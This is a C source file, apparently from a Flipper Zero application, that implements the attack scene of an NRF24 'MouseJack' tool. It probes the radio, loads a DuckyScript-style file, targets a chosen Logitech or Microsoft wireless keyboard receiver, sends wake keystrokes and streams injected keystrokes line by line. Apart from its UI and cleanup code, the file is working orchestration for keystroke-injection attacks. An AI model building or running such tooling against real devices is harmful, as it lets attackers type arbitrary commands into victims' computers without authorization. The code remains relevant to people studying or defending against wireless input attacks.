#include "../nrf24_app.h"
#include "../nrf24_hw.h"
#include "../helpers/nrf24_mj_core.h"
#include "../helpers/nrf24_mj_ducky.h"

#include <furi.h>
#include <string.h>

#define TAG "Nrf24MjAttack"

typedef struct {
    Nrf24App* app;
    FuriThread* worker;
    volatile bool stop;
    MjScript* script;
} Nrf24MjAttackCtx;

static Nrf24MjAttackCtx* g_ctx = NULL;

static int32_t mj_attack_worker(void* context) {
    Nrf24MjAttackCtx* ctx = context;
    Nrf24App* app = ctx->app;

    if(app->mj_selected_target < 0 || app->mj_selected_target >= (int8_t)app->mj_target_count) {
        with_view_model(
            app->mj_attack_view,
            Nrf24MjAttackModel * model,
            {
                model->phase = MjAttackPhaseError;
                strncpy(
                    model->error_text,
                    "No target selected",
                    sizeof(model->error_text) - 1);
            },
            true);
        return 0;
    }

    const MjTarget* target = &app->mj_targets[app->mj_selected_target];

    nrf24_hw_init();

    nrf24_hw_acquire();
    bool ok = nrf24_hw_probe();
    nrf24_hw_release();

    if(!ok) {
        with_view_model(
            app->mj_attack_view, Nrf24MjAttackModel * model, { model->hardware_ok = false; }, true);
        FURI_LOG_W(TAG, "NRF24 probe failed");
        nrf24_hw_deinit();
        return 0;
    }

    /* Open script (uses storage handle from app). */
    const char* path = furi_string_get_cstr(app->mj_script_path);
    ctx->script = mj_script_open(app->storage, path);
    if(!ctx->script) {
        with_view_model(
            app->mj_attack_view,
            Nrf24MjAttackModel * model,
            {
                model->phase = MjAttackPhaseError;
                strncpy(
                    model->error_text, "Cannot open script", sizeof(model->error_text) - 1);
            },
            true);
        nrf24_hw_acquire();
        nrf24_hw_power_down();
        nrf24_hw_release();
        nrf24_hw_deinit();
        return 0;
    }

    /* Update model with script info. */
    char target_label[24];
    mj_format_target(target, target_label, sizeof(target_label));
    with_view_model(
        app->mj_attack_view,
        Nrf24MjAttackModel * model,
        {
            model->phase = MjAttackPhaseRunning;
            model->hardware_ok = true;
            strncpy(model->target_label, target_label, sizeof(model->target_label) - 1);
            model->target_label[sizeof(model->target_label) - 1] = '\0';
            strncpy(
                model->script_name, ctx->script->file_name, sizeof(model->script_name) - 1);
            model->script_name[sizeof(model->script_name) - 1] = '\0';
            model->line_total = ctx->script->total_lines;
            model->line_cur = 0;
        },
        true);

    /* Setup radio. mj_setup_tx_for_target/mj_logitech_wake/mj_inject_keystroke
     * each claim nrf24_hw_acquire()/release() internally for just their SPI
     * burst — do NOT wrap this block in an outer acquire/release. On a
     * shared-SPI board that also takes the global LCD/SD bus lock, and the
     * furi_delay_ms(2) between MS wake keystrokes below would then freeze
     * the display for however long this loop runs. */
    mj_setup_tx_for_target(target);
    mj_logitech_wake(target);
    mj_reset_ms_sequence();
    if(target->vendor == MjVendorMicrosoft || target->vendor == MjVendorMsCrypt) {
        for(int i = 0; i < 6 && !ctx->stop; i++) {
            mj_inject_keystroke(target, 0, 0);
            furi_delay_ms(2);
        }
    }

    /* Stream script line-by-line. mj_script_step() claims the bus itself
     * for each SPI burst — do NOT wrap the call: a line can be a DELAY of up
     * to 60 s or a multi-second STRING, and holding the bus across that
     * would freeze the shared-SPI display/input for the whole line. */
    while(!ctx->stop && !mj_script_done(ctx->script)) {
        bool more = mj_script_step(ctx->script, target, &ctx->stop);

        with_view_model(
            app->mj_attack_view,
            Nrf24MjAttackModel * model,
            {
                model->line_cur = ctx->script->current_line;
                if(ctx->script->last_warning[0]) {
                    strncpy(
                        model->last_warning,
                        ctx->script->last_warning,
                        sizeof(model->last_warning) - 1);
                    model->last_warning[sizeof(model->last_warning) - 1] = '\0';
                }
            },
            true);

        if(!more) break;
        /* Yield briefly so the GUI gets a chance to redraw. */
        furi_delay_ms(1);
    }

    /* Power down. */
    nrf24_hw_acquire();
    nrf24_hw_tx_stop();
    nrf24_hw_power_down();
    nrf24_hw_release();
    nrf24_hw_deinit();

    if(!ctx->stop) {
        with_view_model(
            app->mj_attack_view,
            Nrf24MjAttackModel * model,
            { model->phase = MjAttackPhaseDone; },
            true);
    }
    return 0;
}

void nrf24_app_scene_mj_attack_on_enter(void* context) {
    Nrf24App* app = context;

    Nrf24MjAttackCtx* ctx = malloc(sizeof(Nrf24MjAttackCtx));
    if(!ctx) {
        FURI_LOG_E(TAG, "No memory for attack context");
        return;
    }
    memset(ctx, 0, sizeof(*ctx));
    ctx->app = app;
    g_ctx = ctx;

    with_view_model(
        app->mj_attack_view,
        Nrf24MjAttackModel * model,
        {
            model->phase = MjAttackPhaseIdle;
            model->hardware_ok = true;
            model->target_label[0] = '\0';
            model->script_name[0] = '\0';
            model->line_cur = 0;
            model->line_total = 0;
            model->last_warning[0] = '\0';
            model->error_text[0] = '\0';
            model->current_channel = 0;
        },
        true);

    view_dispatcher_switch_to_view(app->view_dispatcher, Nrf24ViewMjAttack);

    ctx->worker = furi_thread_alloc_ex("Nrf24MjAttack", 4096, mj_attack_worker, ctx);
    furi_thread_start(ctx->worker);
}

bool nrf24_app_scene_mj_attack_on_event(void* context, SceneManagerEvent event) {
    Nrf24App* app = context;
    if(event.type != SceneManagerEventTypeCustom || !g_ctx) return false;
    if(event.event == Nrf24MjAttackEventStop) {
        /* The center (OK) button is the only key the view sends. The footer
         * shows "Stop" only while Running and "Back" otherwise, so OK must
         * match: abort the active run, or leave the scene once it has finished
         * (Done/Error/Idle). Without this, a finished run showed "Back" but OK
         * only re-asserted the stop flag — a dead button that trapped the user
         * until they pressed the physical Back key. */
        MjAttackPhase phase;
        with_view_model(
            app->mj_attack_view, Nrf24MjAttackModel * model, { phase = model->phase; }, false);
        if(phase == MjAttackPhaseScanning || phase == MjAttackPhaseRunning) {
            g_ctx->stop = true;
        } else {
            /* on_exit joins the (already finished) worker and frees g_ctx. */
            scene_manager_previous_scene(app->scene_manager);
        }
        return true;
    }
    return false;
}

void nrf24_app_scene_mj_attack_on_exit(void* context) {
    UNUSED(context);
    if(!g_ctx) return;
    g_ctx->stop = true;
    furi_thread_join(g_ctx->worker);
    furi_thread_free(g_ctx->worker);
    if(g_ctx->script) mj_script_close(g_ctx->script);
    free(g_ctx);
    g_ctx = NULL;
}
